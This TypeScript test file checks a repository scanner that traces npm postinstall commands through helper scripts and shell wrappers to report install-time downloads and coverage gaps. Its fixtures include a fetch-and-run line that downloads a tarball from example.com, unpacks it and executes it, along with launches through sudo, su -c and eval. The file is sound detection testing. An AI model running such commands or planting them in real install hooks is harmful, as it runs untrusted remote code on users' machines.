import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

const file = (path: string, text: string) => ({
  path,
  bytes: new TextEncoder().encode(text),
});
const manifest = (path: string, command: string) =>
  file(path, JSON.stringify({ scripts: { postinstall: command } }));

test("a lifecycle helper's download remains an unretrieved artifact", () => {
  const helper = "curl -fsSL https://example.com/tool.tar.gz -o tool.tar.gz\n";
  const result = inspectRepository({
    files: [
      manifest("package.json", "sh scripts/fetch.sh"),
      file("scripts/fetch.sh", helper),
      file("tests/unreachable.sh", "curl https://example.com/unreachable\n"),
    ],
  });
  expect(result.downloads).toEqual(["https://example.com/tool.tar.gz"]);
  expect(result.coverage.downloads).toEqual({ state: "partial", items: 1 });
  expect(result.visibilityGaps).toContain(
    "Install-time download not retrieved: https://example.com/tool.tar.gz",
  );
  const inventory = JSON.parse(new TextDecoder().decode(result.inventory));
  expect(inventory.classifications).toContainEqual({
    path: "scripts/fetch.sh",
    surfaces: ["installScripts", "source"],
  });
  expect(
    inventory.items.some((item: { text: string }) => item.text === helper),
  ).toBe(true);
});

test("nested package helpers preserve cwd, terminate cycles and deduplicate downloads", () => {
  const result = inspectRepository({
    files: [
      manifest("packages/tool/package.json", "sh ../../shared/first"),
      file("shared/first", "sh ../../shared/second\n"),
      file(
        "shared/second",
        "sh ../../shared/first\ncurl https://example.com/nested\n",
      ),
    ],
  });
  expect(result.downloads).toEqual(["https://example.com/nested"]);
  expect(result.coverage.installScripts).toEqual({
    state: "complete",
    items: 3,
  });
  expect(result.coverage.downloads.items).toBe(1);
});

test("literal directory changes, quoted paths and interpreter helpers retain coverage", () => {
  const result = inspectRepository({
    files: [
      manifest("package.json", "cd scripts; /usr/bin/env sh -e 'fetch data'"),
      file("scripts/fetch data", "node fetch.js\n"),
      file("scripts/fetch.js", 'fetch("https://example.com/module")\n'),
    ],
  });
  expect(result.downloads).toEqual(["https://example.com/module"]);
  expect(result.coverage.installScripts).toEqual({
    state: "complete",
    items: 3,
  });
});

test("missing, escaping and dynamic helper references remain coverage gaps", () => {
  for (const command of ["sh missing", "sh ../outside", 'sh "$HELPER"']) {
    const result = inspectRepository({
      files: [manifest("package.json", command)],
    });
    expect(result.coverage.installScripts.state).toBe("partial");
    expect(
      result.visibilityGaps.some((gap) =>
        gap.startsWith("Local install helper not acquired at package.json:"),
      ),
    ).toBe(true);
  }
});

test("comments and quoted command examples do not make unrelated files install content", () => {
  const result = inspectRepository({
    files: [
      manifest("package.json", "echo 'sh hidden'\n# sh hidden\nnode --version"),
      file("hidden", "curl https://example.com/unreachable\n"),
    ],
  });
  expect(result.downloads).toEqual([]);
  expect(result.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
});

test("common literal dispatch and package aliases follow the same helper", () => {
  for (const command of [
    "env -i sh scripts/fetch.sh",
    "env -S 'sh scripts/fetch.sh'",
    "exec sh scripts/fetch.sh",
    "command sh scripts/fetch.sh",
    "cd . && sh scripts/fetch.sh",
    "npm run setup",
  ]) {
    const result = inspectRepository({
      files: [
        file(
          "package.json",
          JSON.stringify({
            scripts: { postinstall: command, setup: "sh scripts/fetch.sh" },
          }),
        ),
        file("scripts/fetch.sh", "curl https://example.com/dispatch\n"),
      ],
    });
    expect(result.downloads).toEqual(["https://example.com/dispatch"]);
  }
});

test("direct non-shell helpers are reviewed without parsing their strings as shell", () => {
  const result = inspectRepository({
    files: [
      manifest("package.json", "./scripts/setup.js"),
      file(
        "scripts/setup.js",
        '#!/usr/bin/env node\nfetch("https://example.com/node");\n',
      ),
    ],
  });
  expect(result.downloads).toEqual(["https://example.com/node"]);
  expect(result.coverage.installScripts.state).toBe("complete");
});

test("unresolved shell context cannot claim complete helper coverage", () => {
  for (const command of [
    ". change; sh hidden",
    "(cd sub; sh first); sh hidden",
    "false && cd sub; sh hidden",
    "cd sub | true; sh hidden",
    "test -d sub && { cd sub; }; sh hidden",
    "if true; then cd sub; fi; sh hidden",
    "echo $(cd sub && sh hidden)",
    "echo $(sh hidden",
    "echo $((1 + $(sh hidden)))",
    "case x in a) sh hidden;; esac",
  ]) {
    const result = inspectRepository({
      files: [
        manifest("package.json", command),
        file("change", "cd sub"),
        file("hidden", "curl https://example.com/root"),
        file("sub/hidden", "curl https://example.com/sub"),
        file("sub/first", "echo safe"),
      ],
    });
    expect(result.coverage.installScripts.state).toBe("partial");
  }
});

test("quoted here-document bodies and reserved words do not execute helpers", () => {
  for (const command of ["cat <<'EOF'\nsh hidden\nEOF\n", "'then' sh hidden"]) {
    const result = inspectRepository({
      files: [
        manifest("package.json", command),
        file("hidden", "curl https://example.com/inert"),
      ],
    });
    expect(result.downloads).toEqual([]);
  }
});

test("unsupported heredoc tails and package dispatch options stay partial", () => {
  for (const command of [
    "cat <<'EOF'; sh hidden\ndata\nEOF\n",
    "npm --prefix sub run setup",
  ]) {
    const result = inspectRepository({
      files: [
        manifest("package.json", command),
        file("hidden", "curl https://example.com/tail"),
        file(
          "sub/package.json",
          JSON.stringify({ scripts: { setup: "sh hidden" } }),
        ),
        file("sub/hidden", "curl https://example.com/sub"),
      ],
    });
    expect(result.coverage.installScripts.state).toBe("partial");
  }
});

test("syntax-only shell checks do not turn fixture URLs into downloads", () => {
  const result = inspectRepository({
    files: [
      manifest("package.json", "sh -n scripts/check.sh"),
      file("scripts/check.sh", "curl https://example.com/not-executed"),
    ],
  });
  expect(result.downloads).toEqual([]);
});

test("unsupported shell control and dispatch modifiers keep coverage partial", () => {
  for (const command of [
    "if false; then cd sub; fi; sh hidden",
    "eval 'sh hidden'",
    "command -p sh hidden",
    "npm run setup --prefix sub",
  ]) {
    const result = inspectRepository({
      files: [
        file(
          "package.json",
          JSON.stringify({
            scripts: { postinstall: command, setup: "echo safe" },
          }),
        ),
        file("hidden", "curl https://example.com/root"),
        file(
          "sub/package.json",
          JSON.stringify({ scripts: { setup: "sh hidden" } }),
        ),
        file("sub/hidden", "echo safe"),
      ],
    });
    expect(result.coverage.installScripts.state).toBe("partial");
  }
});

test("an explicit shell shebang overrides a helper's filename extension", () => {
  const result = inspectRepository({
    files: [
      manifest("package.json", "./first.js"),
      file("first.js", "#!/bin/sh\nsh hidden"),
      file("hidden", "curl https://example.com/shebang"),
    ],
  });
  expect(result.downloads).toEqual(["https://example.com/shebang"]);
});

test("home expansion cannot resolve to an acquired tilde-named directory", () => {
  const files = [file("~/helper", "curl https://example.com/tilde")];
  const expanded = inspectRepository({
    files: [manifest("package.json", 'sh ~/"helper"'), ...files],
  });
  expect(expanded.coverage.installScripts.state).toBe("partial");
  expect(expanded.downloads).toEqual([]);
  const literal = inspectRepository({
    files: [manifest("package.json", "sh '~/helper'"), ...files],
  });
  expect(literal.downloads).toEqual(["https://example.com/tilde"]);
});

const fetchHelper =
  "curl -fsSL https://example.com/payload.tar.gz -o p.tgz && tar xzf p.tgz && ./p/run\n";
const helperScan = (command: string) => {
  const result = inspectRepository({
    files: [
      manifest("package.json", command),
      file("scripts/fetch.sh", fetchHelper),
    ],
  });
  const inventory = JSON.parse(new TextDecoder().decode(result.inventory));
  return {
    downloads: result.downloads,
    coverage: result.coverage,
    visibilityGaps: result.visibilityGaps,
    classifications: inventory.classifications,
  };
};

test("exec wrappers around a lifecycle helper give the same result as running it directly", () => {
  const direct = helperScan("sh scripts/fetch.sh");
  expect(direct.downloads).toEqual(["https://example.com/payload.tar.gz"]);
  expect(direct.coverage.installScripts.state).toBe("partial");
  expect(direct.coverage.downloads).toEqual({ state: "partial", items: 1 });
  expect(direct.visibilityGaps).toEqual([
    "Local install helper not acquired at scripts/fetch.sh: ./p/run",
    "Install-time download not retrieved: https://example.com/payload.tar.gz",
  ]);
  for (const command of [
    "nice sh scripts/fetch.sh",
    "nice -n 10 sh scripts/fetch.sh",
    "nice -n10 sh scripts/fetch.sh",
    "nice -10 sh scripts/fetch.sh",
    "nice --adjustment=5 sh scripts/fetch.sh",
    "nohup sh scripts/fetch.sh",
    "timeout 60 sh scripts/fetch.sh",
    "timeout -s KILL -k 5 60s sh scripts/fetch.sh",
    "timeout --signal=TERM --preserve-status 60 sh scripts/fetch.sh",
    "xargs -a /dev/null sh scripts/fetch.sh",
    "xargs -0 -n 1 -P4 sh scripts/fetch.sh",
    "stdbuf -oL -e0 sh scripts/fetch.sh",
    "ionice -c 3 sh scripts/fetch.sh",
    "ionice -c2 -n7 sh scripts/fetch.sh",
    "setsid -w sh scripts/fetch.sh",
    "chrt -i 0 sh scripts/fetch.sh",
    "chrt --fifo 10 sh scripts/fetch.sh",
    "taskset 0x1 sh scripts/fetch.sh",
    "taskset -c 0,1 sh scripts/fetch.sh",
    "time sh scripts/fetch.sh",
    "time -p sh scripts/fetch.sh",
    "doas sh scripts/fetch.sh",
    "doas -n -u root sh scripts/fetch.sh",
    "sudo -S sh scripts/fetch.sh",
    "sudo -E -u root sh scripts/fetch.sh",
    "sudo env sh scripts/fetch.sh",
    "env sudo sh scripts/fetch.sh",
    "sudo sudo sh scripts/fetch.sh",
    "env env sh scripts/fetch.sh",
    "sudo nohup sh scripts/fetch.sh",
    "env FOO=1 sudo -n BAR=2 nice nohup sh scripts/fetch.sh",
    "sudo env -S 'sh scripts/fetch.sh'",
    "sudo -S env -S 'sh scripts/fetch.sh'",
    "cross-env NODE_ENV=production sh scripts/fetch.sh",
    "/usr/bin/nice /usr/bin/nohup sh scripts/fetch.sh",
    "su -c 'sh scripts/fetch.sh'",
    "su root -c 'sh scripts/fetch.sh'",
    "su - root -c 'sh scripts/fetch.sh'",
    "su --command='sh scripts/fetch.sh' root",
    "su root scripts/fetch.sh",
    "sh -c 'sh scripts/fetch.sh'",
    "bash -lc 'nice sh scripts/fetch.sh'",
  ]) {
    expect({ command, ...helperScan(command) }).toEqual({
      command,
      ...direct,
    });
  }
});

test("unsupported wrapper options and unknown launchers keep coverage partial", () => {
  for (const command of [
    "nice --bogus sh scripts/fetch.sh",
    "timeout --bogus 60 sh scripts/fetch.sh",
    "sudo -D /tmp sh scripts/fetch.sh",
    "env -C sub sh scripts/fetch.sh",
    "taskset -p 1 sh scripts/fetch.sh",
    'su -c "$CMD"',
    "launch sh scripts/fetch.sh",
    "launch --via bash scripts/fetch.sh",
    "find . -name '*.sh' -exec sh {} ;",
    "launch scripts/fetch.sh",
    "xargs sh",
    "xargs -n1 bash",
  ]) {
    const result = helperScan(command);
    expect({ command, state: result.coverage.installScripts.state }).toEqual({
      command,
      state: "partial",
    });
    expect({
      command,
      gap: result.visibilityGaps.some((gap) =>
        gap.startsWith("Local install helper not acquired at package.json:"),
      ),
    }).toEqual({ command, gap: true });
  }
});

test("ordinary lifecycle commands do not gain helper gaps", () => {
  for (const command of [
    "node build.js",
    "npm run build",
    "tsc -p tsconfig.json && node build.js",
    "rollup -c rollup.config.js",
    "chmod +x scripts/fetch.sh",
    "cp scripts/fetch.sh dist/fetch.sh",
    "sed -i 's/a/b/' scripts/fetch.sh",
    "echo run sh scripts/fetch.sh later",
    "apt-get install -y bash python3",
    "husky install",
    "rsync -a dist/ .",
    "cross-env NODE_ENV=production node build.js",
  ]) {
    const result = inspectRepository({
      files: [
        file(
          "package.json",
          JSON.stringify({ scripts: { postinstall: command, build: "tsc" } }),
        ),
        file("scripts/fetch.sh", fetchHelper),
        file("build.js", "console.log('build')\n"),
        file("rollup.config.js", "export default {}\n"),
        file("tsconfig.json", "{}\n"),
      ],
    });
    expect({ command, gaps: result.visibilityGaps }).toEqual({
      command,
      gaps: [],
    });
  }
});

test("ordinary shell syntax no longer hides a helper it runs (23 November 2026)", () => {
  // Commands inside substitutions, `if` and `{ }` bodies are read as if they
  // run, so the helper they launch is followed, not left as a gap.
  for (const command of [
    "echo $(sh hidden)",
    "v=`sh hidden`",
    'v="$(printf %s "$(sh hidden)")"',
    "if [ -f hidden ]; then sh hidden; fi",
    "test -f hidden && { sh hidden; exit 0; }",
    "if ! command -v node >/dev/null; then sh hidden; fi",
  ]) {
    const result = inspectRepository({
      files: [
        manifest("package.json", command),
        file("hidden", "curl https://example.com/root"),
      ],
    });
    expect(result.downloads).toEqual(["https://example.com/root"]);
    expect(result.coverage.installScripts.state).toBe("complete");
  }
});

test("cd to the script's own directory keeps later helpers resolved", () => {
  for (const line of [
    'cd "$(dirname "$0")"',
    "cd $(dirname $0)",
    // biome-ignore lint/suspicious/noTemplateCurlyInString: a literal shell line.
    'cd "$(dirname "${BASH_SOURCE[0]}")"',
  ]) {
    const result = inspectRepository({
      files: [
        file("tools/setup.sh", `#!/bin/sh\n${line}\nsh ./run.sh\n`),
        file("tools/run.sh", "curl https://example.com/tools\n"),
        file("run.sh", "curl https://example.com/root\n"),
      ],
    });
    expect(result.downloads).toEqual(["https://example.com/tools"]);
    expect(result.coverage.installScripts.state).toBe("complete");
  }
  // In a package script `$0` is the shell, not a file, so the directory is
  // not known and a later local launch stays a gap.
  const result = inspectRepository({
    files: [
      manifest("package.json", 'cd "$(dirname "$0")"; sh ./run.sh'),
      file("run.sh", "curl https://example.com/root\n"),
    ],
  });
  expect(result.coverage.installScripts.state).toBe("partial");
});

test("a one-time database setup script with ordinary shell syntax is complete", () => {
  // The shape of a real self-service project's setup script: it changes to
  // its own directory, branches on `grep`, and runs a package from the
  // registry, but launches no local helper.
  const script = [
    "#!/bin/bash",
    "# creates the d1 db and adds it to wrangler.toml (run once)",
    "set -e",
    'cd "$(dirname "$0")"',
    'grep -q "d1_databases" wrangler.toml && { echo "db already set up"; exit 0; }',
    "npx -y wrangler@latest d1 create app > .d1.txt 2>&1 || true",
    "ID=$(grep -oE '[0-9a-f]{8}-[0-9a-f]{4}' .d1.txt | head -1)",
    '[ -z "$ID" ] && ID=$(npx -y wrangler@latest d1 list 2>/dev/null | grep -w app | head -1)',
    "rm -f .d1.txt",
    '[ -z "$ID" ] && { echo "d1 create failed"; exit 1; }',
    'printf \'\\n[[d1_databases]]\\nbinding = "DB"\\n\' "$ID" >> wrangler.toml',
    'echo "db: $ID"',
    "",
  ].join("\n");
  const result = inspectRepository({
    files: [
      file("setup-db.sh", script),
      file("wrangler.toml", 'name = "app"\n'),
    ],
  });
  expect(
    result.visibilityGaps.filter((gap) =>
      gap.startsWith("Local install helper"),
    ),
  ).toEqual([]);
});
